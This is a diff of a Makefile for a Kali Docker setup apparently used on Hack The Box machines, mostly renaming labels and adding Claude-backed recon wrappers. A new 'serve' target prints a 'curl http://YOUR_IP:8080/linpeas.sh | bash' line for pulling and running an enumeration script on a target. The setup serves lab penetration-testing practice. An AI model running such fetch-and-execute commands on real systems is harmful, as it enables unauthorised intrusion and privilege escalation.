@@ -3,10 +3,10 @@
 #  Usage: make <target>
 # ─────────────────────────────────────────────────────────────
 
-IMAGE    := kali-ctf-env
-# Folder on the host, mounted to /ctfdata inside the container
+IMAGE    := kali-htb
+# Host folder mounted to /ctfdata inside the container
 WORKDIR  := $(PWD)/ctfdata
-CONTAINER:= ctf-box
+CONTAINER:= htb-box
 
 .DEFAULT_GOAL := help
 
@@ -43,7 +43,7 @@ attach: resume  ## Alias for resume
 # ─── Machine management ───────────────────────────────────────
 
 .PHONY: new-machine
-new-machine:  ## Create folder for a new machine: make new-machine NAME=Forest
+new-machine:  ## Create directory for a new machine: make new-machine NAME=Forest
 	@[ -n "$(NAME)" ] || (echo "Usage: make new-machine NAME=<machine>" && exit 1)
 	mkdir -p $(WORKDIR)/$(NAME)/scans $(WORKDIR)/$(NAME)/loot $(WORKDIR)/$(NAME)/exploit $(WORKDIR)/$(NAME)/notes
 	@echo "Created: $(WORKDIR)/$(NAME)/{scans,loot,exploit,notes}"
@@ -52,7 +52,7 @@ new-machine:  ## Create folder for a new machine: make new-machine NAME=Forest
 	    >> $(WORKDIR)/$(NAME)/notes/notes.md
 
 .PHONY: set-target
-set-target:  ## Write target IP: make set-target IP=10.10.11.x
+set-target:  ## Save target IP: make set-target IP=10.10.11.x
 	@[ -n "$(IP)" ] || (echo "Usage: make set-target IP=<ip>" && exit 1)
 	@echo "export TARGET=$(IP)" > $(WORKDIR)/.target
 	@echo "TARGET set to $(IP)"
@@ -60,15 +60,15 @@ set-target:  ## Write target IP: make set-target IP=10.10.11.x
 # ─── Lifecycle ────────────────────────────────────────────────
 
 .PHONY: stop
-stop:  ## Stop the container (data is preserved)
+stop:  ## Stop the container (data preserved)
 	docker stop $(CONTAINER)
 
 .PHONY: rm
-rm: stop  ## Remove the container (image and /ctfdata folder remain)
+rm: stop  ## Remove container (image and /ctfdata folder remain)
 	docker rm $(CONTAINER)
 
 .PHONY: clean
-clean: rm  ## Remove container + image
+clean: rm  ## Remove container and image
 	docker rmi $(IMAGE)
 
 # ─── Utilities ────────────────────────────────────────────────
@@ -80,10 +80,10 @@ shell:  ## Open an additional shell in the running container
 .PHONY: dirs
 dirs:  ## Create base structure ~/ctfdata
 	mkdir -p $(WORKDIR)/scans $(WORKDIR)/loot $(WORKDIR)/exploit $(WORKDIR)/notes $(WORKDIR)/vpn
-	@echo "CTF workdir ready: $(WORKDIR)"
+	@echo "HTB workdir ready: $(WORKDIR)"
 
 .PHONY: vpn
-vpn:  ## Connect VPN from inside container: make vpn FILE=htb.ovpn
+vpn:  ## Connect VPN from inside the container: make vpn FILE=htb.ovpn
 	@[ -n "$(FILE)" ] || (echo "Usage: make vpn FILE=<file.ovpn>" && exit 1)
 	docker exec -it $(CONTAINER) openvpn /ctfdata/vpn/$(FILE)
 
@@ -99,12 +99,33 @@ ps:  ## Container status
 update:  ## Update packages inside the container
 	docker exec -it $(CONTAINER) bash -c "apt-get update && apt-get upgrade -y"
 
+# ─── Claude integration ───────────────────────────────────────
+
+.PHONY: install-scripts
+install-scripts:  ## Install Claude wrapper scripts to /usr/local/bin
+	chmod +x scripts/*
+	sudo cp scripts/nmap-claude scripts/gobuster-claude \
+	         scripts/linpeas-claude scripts/hash-claude \
+	         scripts/ai-recon /usr/local/bin/
+	@echo "Installed: nmap-claude, gobuster-claude, linpeas-claude, hash-claude, ai-recon"
+
+.PHONY: ai-recon
+ai-recon:  ## Full recon with Claude analysis: make ai-recon IP=10.10.11.x [NAME=Forest]
+	@[ -n "$(IP)" ] || (echo "Usage: make ai-recon IP=<ip> [NAME=<machine>]" && exit 1)
+	@bash scripts/ai-recon $(IP) $(NAME)
+
+.PHONY: serve
+serve:  ## HTTP server to serve files to the target (port 8080)
+	@echo "Serving $(WORKDIR) on :8080 — linpeas/winpeas available on the target"
+	@echo "On target: curl http://YOUR_IP:8080/linpeas.sh | bash"
+	cd $(WORKDIR) && python3 -m http.server 8080
+
 # ─── Help ─────────────────────────────────────────────────────
 
 .PHONY: help
 help:  ## Show this help
 	@echo ""
-	@echo "  CTF Docker Environment"
+	@echo "  HTB/CTF Docker Environment"
 	@echo ""
 	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) \
 	    | awk 'BEGIN {FS = ":.*?## "}; {printf "  \033[36mmake %-16s\033[0m %s\n", $$1, $$2}'
